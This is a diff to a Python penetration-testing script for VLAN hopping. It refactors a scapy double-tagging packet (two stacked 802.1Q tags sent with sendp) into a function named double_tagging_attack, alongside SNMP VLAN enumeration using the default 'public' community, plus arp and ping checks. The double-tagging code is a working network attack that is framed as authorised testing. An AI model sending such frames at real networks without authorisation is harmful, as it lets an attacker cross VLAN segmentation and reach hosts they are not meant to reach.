@@ -3,6 +3,7 @@
 
 import os
 import subprocess
+from scapy.all import Ether, Dot1Q, IP, ICMP, sendp
 from pysnmp.hlapi import *
 
 def get_vlan_ids(switch_ip, community='public'):
@@ -29,6 +30,11 @@ def get_vlan_ids(switch_ip, community='public'):
                 vlan_ids.append(vlan_id)
     return vlan_ids
 
+def double_tagging_attack(src_vlan, target_vlan, target_ip):
+    pkt = Ether()/Dot1Q(vlan=src_vlan)/Dot1Q(vlan=target_vlan)/IP(dst=target_ip)/ICMP()
+    sendp(pkt, iface="eth0")
+    print(f"Double tagging attack from VLAN {src_vlan} to VLAN {target_vlan} sent to {target_ip}")
+
 def vlan_hopping_test_linux(switch_ip, community='public'):
     print("Running VLAN hopping test on Linux...")
 
@@ -45,15 +51,10 @@ def vlan_hopping_test_linux(switch_ip, community='public'):
     subprocess.run(['arp', '-a'])
 
     # Double Tagging Test
+    target_ip = f'192.168.{vlan_id2}.1'  # Example target IP
     print(f"Double Tagging Test (VLAN {vlan_id1} -> VLAN {vlan_id2}):")
     subprocess.run(['ping', '-I', f'192.168.{vlan_id1}.1', '-c', '4'])
-
-    # Example Exploitation (with permission)
-    print("Exploitation Example:")
-    from scapy.all import *
-    pkt = Ether()/Dot1Q(vlan=vlan_id1)/Dot1Q(vlan=vlan_id2)/IP(dst=f"192.168.{vlan_id2}.1")/ICMP()
-    sendp(pkt, iface="eth0")
-    print("Exploitation packet sent")
+    double_tagging_attack(vlan_id1, vlan_id2, target_ip)
 
     # SNMP Information Gathering
     print("SNMP Information Gathering:")
@@ -99,4 +100,3 @@ def vlan_hopping_test_linux(switch_ip, community='public'):
 if __name__ == "__main__":
     switch_ip = "192.168.10.1"  # Replace with your switch IP
     vlan_hopping_test_linux(switch_ip)
-
